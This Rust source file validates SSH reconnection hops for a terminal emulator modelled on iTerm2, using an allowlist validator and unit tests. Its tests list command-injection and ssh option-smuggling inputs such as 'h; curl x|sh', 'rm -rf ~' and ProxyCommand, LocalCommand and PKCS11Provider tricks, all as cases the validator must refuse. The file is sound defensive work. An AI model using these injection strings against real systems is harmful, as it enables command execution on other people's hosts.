//! Reconnection through nested ssh hops (milestone 14c): the info a conductor keeps to
//! connect again, the jump script, and the rules for Duplicate Session and splits.
//!
//! Everything here can carry text the remote chose (the ssh arguments a hop reported, the
//! directory its shell reported), so nothing builds a local command line from it without
//! `identity_is_safe`, and every hop a new session reconnects through passes `safe_hops`
//! (a saved list is read back with `jumps_from`, which uses it).

use crate::ssh_args::Identity;
use serde::{Deserialize, Serialize};

/// it2ssh (`IS`), byte for byte: the jump script wraps it.
pub const IT2SSH: &str = include_str!("../resources/ssh/it2ssh");

/// The session-arrangement key holding a pane's jump list (`SESSION_ARRANGEMENT_PENDING_JUMPS`).
pub const PENDING_JUMPS_KEY: &str = "Pending Jumps";

/// The most hops a saved list may name: the hook tree's depth limit plus the first hop.
const MAX_JUMPS: usize = 16;

/// What it takes to connect to one hop again (`SSHReconnectionInfo`, `CD:737-741`).
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct Reconnection {
    pub sshargs: String,
    pub initial_directory: Option<String>,
    pub boolargs: String,
}

/// The script a conductor evals to jump to the next hop (`CD:1754-1770`): it2ssh wrapped in
/// a function and run with the hop's arguments, after the script removes its own file.
/// Beyond iTerm2 (which puts the text in as it is): the arguments are read back as words
/// (`hop_words`) and each goes in quoted as `%q` quotes it, so no text a hop reported is ever
/// shell syntax in the remote `eval` (ruling, final review I1). Text not in that form gives
/// no arguments; `Conductor::start_jumping` takes only hops `safe_hops` passed.
pub fn jump_script(it2ssh: &str, sshargs: &str) -> String {
    let args = crate::util_it2ssh::requote(&hop_words(sshargs).unwrap_or_default());
    format!("#!/usr/bin/env bash\nrm $SELF\nunset SELF\nit2ssh_wrapper() {{\n{it2ssh}\n}}\nit2ssh_wrapper {args}")
}

/// How the new conductor of a hooked session starts.
#[derive(Clone, Debug, PartialEq)]
pub enum Start {
    /// `startJumping(to:)` with the jumps left in the pane's list.
    Jump(Vec<Reconnection>),
    /// The previous conductor had jumps left: the new one takes them and the previous one is
    /// told (`childDidBeginJumping`).
    ParentJumps(Vec<Reconnection>),
    Plain,
}

/// The hook's directory and start (`PS:20129-20169`).
#[derive(Clone, Debug, PartialEq)]
pub struct HookPlan {
    pub directory: Option<String>,
    pub start: Start,
}

/// What a hook does with the pane's pending jumps: the profile's `PWD` counts only while no
/// conductor exists yet, and a pending jump's directory replaces it (even when it has none).
/// The first pending jump is used up; what is left starts the jumping when there is no
/// previous conductor, else the previous conductor's own subsequent jumps do.
pub fn hook_plan(pending: &mut Vec<Reconnection>, profile_pwd: Option<String>, has_previous: bool, previous_subsequent: &[Reconnection]) -> HookPlan {
    let mut directory = if has_previous { None } else { profile_pwd };
    if !pending.is_empty() {
        directory = pending.remove(0).initial_directory;
    }
    let start = if !has_previous && !pending.is_empty() {
        Start::Jump(pending.clone())
    } else if has_previous && !previous_subsequent.is_empty() {
        Start::ParentJumps(previous_subsequent.to_vec())
    } else {
        Start::Plain
    };
    HookPlan { directory, start }
}

/// Duplicate Session (`PT:2776-2808`): the command that makes the new pane an SSH session
/// when its profile is not one (the first hop's arguments), and the jumps in every case.
#[derive(Clone, Debug, PartialEq)]
pub struct DupPlan {
    pub command: Option<String>,
    pub jumps: Vec<Reconnection>,
}

pub fn duplicate_plan(profile_is_ssh: bool, sequence: &[Reconnection]) -> DupPlan {
    let command = if profile_is_ssh { None } else { sequence.first().map(|first| first.sshargs.clone()) };
    DupPlan { command, jumps: sequence.to_vec() }
}

/// The profile a split from an ssh session starts with (`PS:2948-2953`): the base with an
/// SSH command type, the identity's command line and an empty SSH configuration.
pub fn split_profile(base: &toml::Table, command_line: &str) -> toml::Table {
    let mut out = base.clone();
    out.insert("Custom Command".into(), "SSH".into());
    out.insert("Command".into(), command_line.into());
    out.insert("SSH".into(), toml::Value::Table(toml::Table::new()));
    out
}

/// A directory a remote shell reported, when it is one line of text (a newline would add
/// lines to the framer's `login` command).
pub fn clean_directory(dir: &str) -> Option<String> {
    (!dir.is_empty() && !dir.chars().any(char::is_control)).then(|| dir.to_string())
}

/// A folder an arrangement saved for a session, when it can name a remote folder: a POSIX
/// path (or `~`) of one line. A Windows folder cannot.
pub fn saved_remote_directory(saved: &str) -> Option<String> {
    Some(saved).filter(|d| d.starts_with(['/', '~'])).and_then(clean_directory)
}

/// Whether a host or user name may go into a command line Termurion runs locally: made of the
/// characters real names use, and not starting with `-` (ssh would read it as an option, such
/// as `-oProxyCommand=...`).
pub fn identity_is_safe(id: &Identity) -> bool {
    let word = |w: &str| !w.is_empty() && !w.starts_with('-') && w.chars().all(|c| c.is_ascii_alphanumeric() || "._-:@%[]+~".contains(c));
    word(&id.hostname) && id.username.as_deref().is_none_or(word)
}

/// A jump list as a value for a saved session (`iTermSSHReconnectionInfo.serialized`).
pub fn jumps_value(jumps: &[Reconnection]) -> toml::Value {
    let one = |j: &Reconnection| {
        let mut t = toml::Table::new();
        t.insert("sshargs".into(), j.sshargs.clone().into());
        if let Some(dir) = &j.initial_directory {
            t.insert("initialDirectory".into(), dir.clone().into());
        }
        t.insert("boolargs".into(), j.boolargs.clone().into());
        toml::Value::Table(t)
    };
    toml::Value::Array(jumps.iter().map(one).collect())
}

/// A jump list read back. A file can be edited and a session's text came from a remote host,
/// so a list with an entry of the wrong shape, or one `safe_hops` refuses (they reach a remote
/// `eval`), is dropped whole: the session then starts as an ordinary one.
pub fn jumps_from(v: &toml::Value) -> Vec<Reconnection> {
    let Some(items) = v.as_array().filter(|a| a.len() <= MAX_JUMPS) else { return Vec::new() };
    let mut out = Vec::new();
    for item in items {
        let Some(t) = item.as_table() else { return Vec::new() };
        let text = |k: &str| t.get(k).and_then(toml::Value::as_str).map(str::to_string);
        let (Some(sshargs), Some(boolargs)) = (text("sshargs"), text("boolargs")) else { return Vec::new() };
        out.push(Reconnection { sshargs, initial_directory: text("initialDirectory"), boolargs });
    }
    safe_hops(&out).unwrap_or_default()
}

/// The ssh flags that take no value a hop may carry, alone or clustered (`-4qv`). Every other
/// option refuses the hop, `-o` in any spelling with it (ruling, residual round 2).
const FLAG_LETTERS: &str = "46qvC";

/// The hops a new session may reconnect through (Duplicate Session, Duplicate Tab, an
/// arrangement), or None for a plain session: the one validator for all of them (ruling,
/// final review I1). Every hop must be one line of text, its ssh arguments words as it2ssh
/// quotes them (`hop_words`), and every word one an allowlist names (`words_are_safe`). One
/// refused hop refuses the list, as does an empty list or one longer than `MAX_JUMPS`.
pub fn safe_hops(hops: &[Reconnection]) -> Option<Vec<Reconnection>> {
    (!hops.is_empty() && hops.len() <= MAX_JUMPS && hops.iter().all(hop_is_safe)).then(|| hops.to_vec())
}

fn hop_is_safe(hop: &Reconnection) -> bool {
    let bad = |s: &str| s.chars().any(char::is_control);
    if bad(&hop.boolargs) || hop.initial_directory.as_deref().is_some_and(bad) {
        return false;
    }
    hop_words(&hop.sshargs).is_some_and(|words| words_are_safe(&words))
}

/// Whether every word is allowed (ruling, residual round 2, which replaces the denylist of
/// options and keywords that kept leaking): flags from `FLAG_LETTERS`, `-p <port>`,
/// `-l <user>`, `-J <jump list>` (the value in the same word or the next), and exactly one
/// destination, `[user@]host`. Anything else, `-o`, `--`, a remote command or a second host,
/// refuses the hop.
fn words_are_safe(words: &[String]) -> bool {
    let mut destination = false;
    let mut words = words.iter();
    while let Some(w) = words.next() {
        let Some(letters) = w.strip_prefix('-') else {
            if destination || !user_host_is_safe(w, true) {
                return false;
            }
            destination = true;
            continue;
        };
        if !letters.is_empty() && letters.chars().all(|c| FLAG_LETTERS.contains(c)) {
            continue;
        }
        let mut chars = letters.chars();
        let (letter, rest) = (chars.next(), chars.as_str());
        let value = if rest.is_empty() { words.next().map(String::as_str) } else { Some(rest) };
        let Some(value) = value else { return false };
        let ok = match letter {
            Some('p') => port_is_safe(value),
            Some('l') => user_is_safe(value),
            Some('J') => value.split(',').all(jump_is_safe),
            _ => false,
        };
        if !ok {
            return false;
        }
    }
    destination
}

/// A user name: `[A-Za-z0-9._-]+`, not starting with `-`.
pub(crate) fn user_is_safe(user: &str) -> bool {
    !user.is_empty() && !user.starts_with('-') && user.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
}

/// A host: `[A-Za-z0-9.-]+` not starting with `-`, or a bracketed IPv6 literal
/// `[0-9A-Fa-f:.]+`, with a `%zone` of `[A-Za-z0-9]+` only where `zone` allows one.
pub(crate) fn host_is_safe(host: &str, zone: bool) -> bool {
    if let Some(literal) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        let (address, zone_id) = match literal.split_once('%') {
            Some((a, z)) if zone => (a, Some(z)),
            Some(_) => return false,
            None => (literal, None),
        };
        return !address.is_empty()
            && address.chars().all(|c| c.is_ascii_hexdigit() || c == ':' || c == '.')
            && zone_id.is_none_or(|z| !z.is_empty() && z.chars().all(|c| c.is_ascii_alphanumeric()));
    }
    !host.is_empty() && !host.starts_with('-') && host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
}

/// A port: decimal digits naming 1-65535.
pub(crate) fn port_is_safe(port: &str) -> bool {
    port.bytes().all(|b| b.is_ascii_digit()) && port.parse::<u16>().is_ok_and(|p| p > 0)
}

/// `[user@]host` by the rules above.
fn user_host_is_safe(word: &str, zone: bool) -> bool {
    match word.split_once('@') {
        Some((user, host)) => user_is_safe(user) && host_is_safe(host, zone),
        None => host_is_safe(word, zone),
    }
}

/// One entry of a `-J` list, `[user@]host[:port]`: OpenSSH pastes it unquoted into the inner
/// ssh's `sh -c` line, URL-decoding an `ssh://` form and stripping brackets first, so nothing
/// outside the plain user, host and port forms passes, and no `%` (no zone either: a
/// ProxyCommand's `%` tokens are expanded).
fn jump_is_safe(entry: &str) -> bool {
    let (user, host_port) = match entry.split_once('@') {
        Some((u, hp)) => (Some(u), hp),
        None => (None, entry),
    };
    let (host, port) = match host_port.find(']') {
        Some(end) if host_port.starts_with('[') => {
            let (h, rest) = host_port.split_at(end + 1);
            match rest.strip_prefix(':') {
                Some(p) => (h, Some(p)),
                None if rest.is_empty() => (h, None),
                None => return false,
            }
        }
        _ => match host_port.split_once(':') {
            Some((h, p)) => (h, Some(p)),
            None => (host_port, None),
        },
    };
    user.is_none_or(user_is_safe) && host_is_safe(host, false) && port.is_none_or(port_is_safe)
}

/// A restored session's pending jumps (`PS:2214`): only a session that runs ssh takes them,
/// since only such a session's are saved (`PS:7342-7347`). On any other pane they would wait
/// for an it2ssh typed by hand and then run the file's hops on that host.
pub fn restored_jumps(saved: Option<&toml::Value>, profile_ssh: bool) -> Vec<Reconnection> {
    saved.filter(|_| profile_ssh).map(jumps_from).unwrap_or_default()
}

/// A hop's ssh arguments as the words they stand for, when they are words as it2ssh writes
/// them (`printf "%q "`, `IS:66-69`), the form iTerm2's jump script assumes when it puts them
/// unquoted after `it2ssh_wrapper` in a remote `eval` (`CD:1754-1770`): words split by one
/// space, each `''` or characters that `%q` leaves bare, any character escaped with a
/// backslash. None for anything else: a shell metacharacter outside that (`;`, `|`, `$(`, a
/// backquote, a quote, a redirection), or a `$'...'` word, which holds control characters.
pub fn hop_words(sshargs: &str) -> Option<Vec<String>> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut chars = sshargs.chars().peekable();
    // The previous character of the current word; None at a word's start.
    let mut prev: Option<char> = None;
    while let Some(c) = chars.next() {
        match c {
            // Words split by exactly one space: an empty word is `''`.
            ' ' if prev.is_none() => return None,
            ' ' => {
                words.push(std::mem::take(&mut word));
                prev = None;
            }
            '\\' => match chars.next() {
                Some(e) if !e.is_control() => {
                    word.push(e);
                    prev = Some(e);
                }
                _ => return None,
            },
            '\'' if prev.is_none() && chars.peek() == Some(&'\'') => {
                chars.next();
                if chars.peek().is_some_and(|&n| n != ' ') {
                    return None;
                }
                prev = Some('\'');
            }
            c if crate::util_it2ssh::needs_quote(c, prev) || c.is_control() => return None,
            c => {
                word.push(c);
                prev = Some(c);
            }
        }
    }
    if prev.is_some() {
        words.push(word);
    }
    Some(words)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn r(args: &str, dir: Option<&str>) -> Reconnection {
        Reconnection { sshargs: args.into(), initial_directory: dir.map(String::from), boolargs: String::new() }
    }

    #[test]
    fn jump_script_follows_iterm2() {
        assert_eq!(jump_script("BODY\n", "-p 22 h"), "#!/usr/bin/env bash\nrm $SELF\nunset SELF\nit2ssh_wrapper() {\nBODY\n\n}\nit2ssh_wrapper -p 22 h ");
        assert!(IT2SSH.starts_with("#!"));
        assert_eq!(IT2SSH.lines().count(), 193);
        assert_eq!(IT2SSH.matches('\n').count(), 193, "the file ends with a newline, as wc -l counts");
    }

    #[test]
    fn hook_plan_follows_iterm2() {
        let (a, b, c) = (r("a", Some("/da")), r("b", Some("/db")), r("c", None));
        // Two pending: the first names the directory, the rest jump.
        let mut pending = vec![a.clone(), b.clone()];
        let plan = hook_plan(&mut pending, Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Jump(vec![b.clone()])));
        assert_eq!(pending, std::slice::from_ref(&b));
        // One pending: nothing left to jump to.
        let mut pending = vec![a.clone()];
        let plan = hook_plan(&mut pending, Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Plain));
        assert!(pending.is_empty());
        // A pending jump without a directory still overrides the profile's.
        let mut pending = vec![c.clone()];
        assert_eq!(hook_plan(&mut pending, Some("/p".into()), false, &[]).directory, None);
        // None pending: the profile's PWD, only with no previous conductor.
        let plan = hook_plan(&mut Vec::new(), Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/p"), Start::Plain));
        assert_eq!(hook_plan(&mut Vec::new(), Some("/p".into()), true, &[]).directory, None);
        // A previous conductor with jumps left hands them on.
        let plan = hook_plan(&mut Vec::new(), None, true, std::slice::from_ref(&c));
        assert_eq!(plan.start, Start::ParentJumps(vec![c.clone()]));
        // ... and pending [a, b] with a previous conductor and no jumps of its own: a's
        // directory, a plain start.
        let mut pending = vec![a.clone(), b.clone()];
        let plan = hook_plan(&mut pending, None, true, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Plain));
        // Without a previous conductor the parent's jumps mean nothing.
        let plan = hook_plan(&mut Vec::new(), None, false, &[c]);
        assert_eq!(plan.start, Start::Plain);
    }

    #[test]
    fn duplicate_follows_iterm2() {
        let (s0, s1) = (r("h1", Some("/a")), r("h2", Some("/b")));
        let plan = duplicate_plan(true, &[s0.clone(), s1.clone()]);
        assert_eq!((plan.command, plan.jumps), (None, vec![s0.clone(), s1.clone()]));
        let plan = duplicate_plan(false, &[s0.clone(), s1.clone()]);
        assert_eq!((plan.command.as_deref(), plan.jumps), (Some("h1"), vec![s0.clone(), s1.clone()]));
        assert_eq!(duplicate_plan(false, &[]).command, None);

        let mut base = toml::Table::new();
        base.insert("Name".into(), "n".into());
        base.insert("Custom Command".into(), "Yes".into());
        base.insert("Command".into(), "pwsh".into());
        let split = split_profile(&base, "-l u -p 2222 h.lan");
        assert_eq!(split.get("Custom Command").and_then(|v| v.as_str()), Some("SSH"));
        assert_eq!(split.get("Command").and_then(|v| v.as_str()), Some("-l u -p 2222 h.lan"));
        assert_eq!(split.get("SSH").and_then(|v| v.as_table()).map(toml::Table::len), Some(0));
        assert_eq!(split.get("Name").and_then(|v| v.as_str()), Some("n"));
        assert_eq!(base.get("Command").and_then(|v| v.as_str()), Some("pwsh"), "the base is not changed");

        assert_eq!(jumps_from(&jumps_value(&[s0.clone(), s1.clone()])), [s0, s1]);
    }

    #[test]
    fn identity_command_line_follows_iterm2() {
        let id = |user: Option<&str>, port: u16| crate::ssh_args::Identity { host: "h".into(), hostname: "h.lan".into(), username: user.map(String::from), port };
        assert_eq!(id(Some("u"), 2222).command_line(), "-l u -p 2222 h.lan");
        assert_eq!(id(None, 22).command_line(), "h.lan");
        assert_eq!(id(Some("u"), 22).command_line(), "-l u h.lan");
        assert_eq!(id(None, 2200).command_line(), "-p 2200 h.lan");
    }

    #[test]
    fn remote_text_is_never_trusted_locally() {
        // A saved list with a control character anywhere is dropped whole.
        let mut v = jumps_value(&[r("a", Some("/x")), r("b", None)]);
        v.as_array_mut().unwrap()[1].as_table_mut().unwrap().insert("sshargs".into(), "b\nrm -rf x".into());
        assert!(jumps_from(&v).is_empty());
        let mut v = jumps_value(&[r("a", Some("/x"))]);
        v.as_array_mut().unwrap()[0].as_table_mut().unwrap().insert("initialDirectory".into(), "/x\ny".into());
        assert!(jumps_from(&v).is_empty());
        assert!(jumps_from(&toml::Value::String("x".into())).is_empty());
        // Too many hops is a broken list.
        let many: Vec<Reconnection> = (0..40).map(|i| r(&format!("h{i}"), None)).collect();
        assert!(jumps_from(&jumps_value(&many)).is_empty());
        // A directory the remote reported is kept only when it is one line of text.
        assert_eq!(clean_directory("/home/u"), Some("/home/u".to_string()));
        assert_eq!(clean_directory("/a\nb"), None);
        assert_eq!(clean_directory(""), None);
        assert_eq!(saved_remote_directory("/srv/x"), Some("/srv/x".to_string()));
        assert_eq!(saved_remote_directory("~/x"), Some("~/x".to_string()));
        assert_eq!(saved_remote_directory("C:\\Users\\x"), None);
        assert_eq!(saved_remote_directory("/a\rb"), None);
        // Names that could be read as ssh options or as several words never reach a local command line.
        let id = |host: &str, user: Option<&str>| crate::ssh_args::Identity { host: host.into(), hostname: host.into(), username: user.map(String::from), port: 22 };
        assert!(identity_is_safe(&id("h.lan", Some("u"))));
        assert!(!identity_is_safe(&id("-oProxyCommand=calc", None)));
        assert!(!identity_is_safe(&id("h", Some("-oX=y"))));
        assert!(!identity_is_safe(&id("h h", None)));
        assert!(!identity_is_safe(&id("h\n", None)));
        assert!(!identity_is_safe(&id("", None)));
    }

    /// An arrangement file's hops reach a remote `eval` as `it2ssh_wrapper <sshargs>`
    /// (`CD:1754-1770`), which iTerm2 gets away with because it2ssh wrote them with
    /// `printf "%q "` (`IS:66-69`). A hop that is not in that form (a `;`, a `|`, a `$(...)`,
    /// a backquote, a redirection outside quoting) drops the list.
    #[test]
    fn saved_hops_must_be_quoted_as_it2ssh_quotes() {
        let list = |args: &str| jumps_value(&[r("-p 22 h ", None), r(args, Some("/x"))]);
        for good in ["-p 2222 user@host ", "h", "-J a\\,b h"] {
            assert_eq!(jumps_from(&list(good)).len(), 2, "{good}");
        }
        assert_eq!(jumps_from(&list(&crate::util_it2ssh::requote(&["-J".into(), "a,b:22".into(), "[::1]".into()]))).len(), 2, "what it2ssh writes for allowed words");
        // In it2ssh's form but outside the allowlist (residual round 2).
        for bad in ["-o ProxyJump=a\\,b h", "a\\*c\\?d h ", "-l '' h ", "\\~u h", "-o ServerAliveInterval=30 h"] {
            assert!(jumps_from(&list(bad)).is_empty(), "{bad}");
        }
        // Escaped metacharacters and spaces are in it2ssh's form, but final review I1's screen
        // and residual 2 refuse them in any word (`words_are_safe`).
        for bad in ["a\\ b\\*c\\?d h ", "a\\ b\\;c\\|d h ", "\\$HOME h", "it\\'s h", "\\{x\\} h"] {
            assert!(jumps_from(&list(bad)).is_empty(), "{bad}");
        }
        for bad in ["h; curl x|sh", "h && rm -rf ~", "$(id) h", "`id` h", "h > /tmp/x", "h | sh", "'a b' h", "\"a\" h", "h &", "h\\", "*", "h #x", "~/x h", "a  b", " h"] {
            assert!(jumps_from(&list(bad)).is_empty(), "{bad}");
        }
    }

    /// Final review I1 (ruling): one validator for every hop a new session reconnects through
    /// (Duplicate Session, Duplicate Tab, an arrangement). Its text reaches a remote `eval`, so
    /// an option that runs a command or loads code or another configuration refuses the hop,
    /// in every spelling ssh takes; so does a shell metacharacter in any word.
    #[test]
    fn a_hop_that_runs_a_command_is_refused() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        for good in ["-p 2222 user@host ", "h", "-J bastion h ", "-4 -q h "] {
            assert!(one(good).is_some(), "{good}");
        }
        for bad in [
            "-o ProxyJump=a\\,b h ",
            "-o ServerAliveInterval=30 h ",
            "-4 -t h ",
            "-l '' h ",
            "-oProxyCommand=sh\\ -c\\ id h ",
            "-o ProxyCommand=id h ",
            "-o ProxyCommand\\ id h ",
            "-oproxycommand=id h ",
            "-o PROXYCOMMAND=id h ",
            "-oLocalCommand=id -oPermitLocalCommand=yes h ",
            "-o PermitLocalCommand=yes h ",
            "-oRemoteCommand=id h ",
            "-o KnownHostsCommand=id h ",
            "-o Match\\ exec\\ id h ",
            "-oMatch=all h ",
            "-F cfg h ",
            "-Fcfg h ",
            "-4F cfg h ",
            "-4oProxyCommand=id h ",
            "-o \\ ProxyCommand=id h ",
            "-o \\\"ProxyCommand\\\"\\ id h ",
            "-I lib.so h ",
            "-o PKCS11Provider=x.so h ",
            "-o XAuthLocation=/tmp/x h ",
            "-E log h ",
            r"h\;id ",
            "a\\$\\(id\\) h ",
            "",
        ] {
            assert!(one(bad).is_none(), "{bad}");
        }
        // One refused hop refuses the list; so does a control character in any field.
        assert!(safe_hops(&[r("h1 ", None), r("-oProxyCommand=id h2 ", None)]).is_none());
        assert!(safe_hops(&[r("h1 ", Some("/a\nb"))]).is_none());
        assert!(safe_hops(&[]).is_none());
        // The arrangement path takes the same validator.
        assert!(jumps_from(&jumps_value(&[r("h1 ", None), r("-oProxyCommand=id h2 ", None)])).is_empty());
        assert!(jumps_from(&jumps_value(&[r("-F /tmp/c h ", None)])).is_empty());
    }

    /// Residual 1: OpenSSH's configuration-line tokenizer takes a `=` before the keyword too
    /// (`-o=X=v`, `-o =X=v`), so the screen skips it as it skips spaces and quotes.
    #[test]
    fn an_equals_sign_before_the_keyword_is_still_screened() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        for bad in ["-o=ProxyCommand=id h ", "-o =ProxyCommand=id h ", "-o==LocalCommand=id h ", "-4o=Match=all h ", "-o =\\ ProxyCommand=id h "] {
            assert!(one(bad).is_none(), "{bad}");
        }
        assert!(one("-o=ServerAliveInterval=30 h ").is_none(), "no -o at all (residual round 2)");
    }

    /// Residual 2: OpenSSH pastes a `-J` / ProxyJump value unquoted into a shell command line,
    /// so a hop word may hold no whitespace (raw or escaped) and no part of a jump value may
    /// start with `-` (it would be read as an option of the inner ssh).
    #[test]
    fn a_jump_value_cannot_carry_options() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        for good in ["-J bastion h ", "-J u@b1:22\\,b2 h ", "-Jb1 h "] {
            assert!(one(good).is_some(), "{good}");
        }
        for bad in [
            "-o ProxyJump=a\\,b h ",
            "-oProxyJump=u@a:2200 h ",
            "-J a\\ -oProxyCommand=id h ",
            "-J a\\,-oProxyCommand=id h ",
            "-Ja\\,-F\\ cfg h ",
            "-J -oProxyCommand=id h ",
            "-J u@-oProxyCommand=id h ",
            "-4J a\\,-oX=y h ",
            "-o ProxyJump=a\\ -oProxyCommand=id h ",
            "-oProxyJump=a\\,-oProxyCommand=id h ",
            "-o ProxyJump=-oProxyCommand=id h ",
            "-o =proxyjump=b\\,-Fx h ",
            "-o SetEnv\\ A=b h ",
            "a\\ b h ",
        ] {
            assert!(one(bad).is_none(), "{bad}");
        }
    }

    /// Residual 3 (ruling): options that write files or open forwards refuse the hop too, so a
    /// duplicated or restored session never binds ports or writes sockets on the host above.
    #[test]
    fn a_hop_that_writes_files_or_opens_forwards_is_refused() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        for bad in [
            "-o UserKnownHostsFile=/tmp/k h ",
            "-oGlobalKnownHostsFile=/tmp/k h ",
            "-o ControlPath=/tmp/s h ",
            "-o ControlMaster=yes h ",
            "-S /tmp/s h ",
            "-M h ",
            "-4M h ",
            "-o LocalForward=8080:x:80 h ",
            "-o RemoteForward=9000:x:22 h ",
            "-o DynamicForward=1080 h ",
            "-L 8080:localhost:80 h ",
            "-L8080:localhost:80 h ",
            "-R 9000:localhost:22 h ",
            "-D 1080 h ",
            "-o Tunnel=yes h ",
            "-o TunnelDevice=any h ",
            "-w 0:0 h ",
        ] {
            assert!(one(bad).is_none(), "{bad}");
        }
        // A refused hop gives a plain session: no hops at all.
        assert!(jumps_from(&jumps_value(&[r("h1 ", None), r("-L 1:x:1 h2 ", None)])).is_empty());
        assert!(one("-p 2222 -4 h ").is_some());
        assert!(one("-p 2222 -4 -t h ").is_none(), "-t is not on the allowlist (residual round 2)");
    }

    /// Residual round 2 (ruling): the screen is an allowlist. OpenSSH 7.7-9.5 URL-decodes an
    /// `ssh://` jump's user (`%3B`, `+`) into the inner ssh's `sh -c` line, before 9.6 strips a
    /// bracketed jump host to `-o...`, and `SmartcardDevice` is `PKCS11Provider` under another
    /// name: each refuses the hop, as does every word outside the allowed forms.
    #[test]
    fn only_allowed_words_make_a_hop() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        let accepted: Vec<&str> = [
            "-J ssh://a%3Bid%3B@b h ",
            "-J ssh://a%20-oProxyCommand=id@b h ",
            "-J ssh://a+b@127.0.0.9 h ",
            "-J a%d@b h ",
            "-o ProxyJump=ssh://a%3Bid%3B@b h ",
            "-J \\[-oProxyCommand=id\\] h ",
            "-J u@\\[-oProxyCommand=id\\]:22 h ",
            "-o SmartcardDevice=/x/lib.so h ",
            "-oSmartcardDevice=/x/lib.so h ",
            "ssh://a%3Bid@h ",
            "-t h ",
            "-A h ",
            "-X h ",
            "-p 0 h ",
            "-p 65536 h ",
            "-p 22x h ",
            "-l -x h ",
            "-J [::1]%eth0 h ",
            "h id ",
            "-- h ",
            "-4 ",
        ]
        .into_iter()
        .filter(|bad| one(bad).is_some())
        .collect();
        assert!(accepted.is_empty(), "accepted: {accepted:?}");
        for good in ["h ", "user@host -p 2222 ", "-p 2222 user@host ", "-J a@b:22\\,c h ", "-J \\[::1\\]:22 h ", "\\[fe80::1%eth0\\] ", "u@\\[::1\\] ", "-4qvC -l u.x -p22 -Jb1 h.lan "] {
            assert!(one(good).is_some(), "{good}");
        }
    }

    /// Every argument goes into the remote `eval` quoted as `%q` quotes it, whatever the hop's
    /// text says.
    #[test]
    fn the_jump_script_quotes_every_argument() {
        let s = jump_script("B", "h; curl x|sh");
        assert!(!s.contains("; curl"), "{s}");
        assert!(jump_script("B", "-p 22 a\\ b ").ends_with("\nit2ssh_wrapper -p 22 a\\ b "));
        assert!(jump_script("B", "-p 22 h").ends_with("\nit2ssh_wrapper -p 22 h "));
    }

    /// Pending Jumps are written only for an SSH-type profile (`PS:7342-7347`), so only such a
    /// restored session takes them: on any other pane they would wait for an it2ssh typed by
    /// hand and then run the file's hops on that host.
    #[test]
    fn only_an_ssh_session_takes_restored_jumps() {
        let v = jumps_value(&[r("a", Some("/x")), r("b", None)]);
        assert_eq!(restored_jumps(Some(&v), true).len(), 2);
        assert!(restored_jumps(Some(&v), false).is_empty(), "a session that does not run ssh");
        assert!(restored_jumps(None, true).is_empty());
    }
}
